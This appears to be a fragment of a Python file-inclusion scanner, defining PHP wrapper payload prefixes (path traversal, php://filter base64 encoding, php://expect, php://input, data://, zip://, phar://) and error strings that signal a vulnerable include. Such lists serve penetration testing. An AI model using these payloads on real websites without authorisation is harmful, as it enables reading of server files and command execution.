payloads = {
    "../": "../",
    "b64encode"        : "php://filter/convert.base64-encode/resource=",
    "b64decode"        : "php://filter/convert.base64-decode/resource=",
    "expect"           : "php://expect/",
    "input"            : "php://input",
    "data://"          : "data://text/plain;base64,",
    "zip://"           : "zip://",
    "phar://"          : "phar://"
}

errors = [
    "Warning: file_exists()",
    "Warning: include()",
    "failed to open stream"    
]